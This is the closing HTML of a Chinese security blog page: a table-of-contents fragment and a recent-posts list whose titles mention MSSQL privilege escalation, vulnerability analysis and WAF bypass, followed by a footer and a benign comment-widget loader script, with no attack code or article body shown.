toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sp-oacreate%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.6.2.</span> <span class="toc-text">使用sp_oacreate进行提权|无回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.3.</span> <span class="toc-text">沙盒提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.7.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/30687.html" title="SpringCloudFunction漏洞分析"><img src="/img/image/26.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SpringCloudFunction漏洞分析"/></a><div class="content"><a class="title" href="/posts/30687.html" title="SpringCloudFunction漏洞分析">SpringCloudFunction漏洞分析</a><time datetime="2022-03-28T11:08:34.000Z" title="发表于 2022-03-28 19:08:34">2022-03-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/61064.html" title="数据库相关"><img src="/img/image/25.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据库相关"/></a><div class="content"><a class="title" href="/posts/61064.html" title="数据库相关">数据库相关</a><time datetime="2022-03-26T13:26:04.000Z" title="发表于 2022-03-26 21:26:04">2022-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/26357.html" title="codeql-java测试"><img src="/img/image/24.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="codeql-java测试"/></a><div class="content"><a class="title" href="/posts/26357.html" title="codeql-java测试">codeql-java测试</a><time datetime="2022-03-25T15:48:57.000Z" title="发表于 2022-03-25 23:48:57">2022-03-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/40079.html" title="codeql测试fastjson"><img src="/img/image/23.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="codeql测试fastjson"/></a><div class="content"><a class="title" href="/posts/40079.html" title="codeql测试fastjson">codeql测试fastjson</a><time datetime="2022-03-25T14:15:27.000Z" title="发表于 2022-03-25 22:15:27">2022-03-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/39835.html" title="绕过Waf之分块传输"><img src="/img/image/22.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="绕过Waf之分块传输"/></a><div class="content"><a class="title" href="/posts/39835.html" title="绕过Waf之分块传输">绕过Waf之分块传输</a><time datetime="2022-03-23T14:22:37.000Z" title="发表于 2022-03-23 22:22:37">2022-03-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/image/25.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By h0ld1rs</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'commnet-1gmkug2k1ca99452',
+      region: '',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.vemoji)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    twikoo.getCommentsCount({
+      envId: 'commnet-1gmkug2k1ca99452',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      document.getElementById('twikoo-count').innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
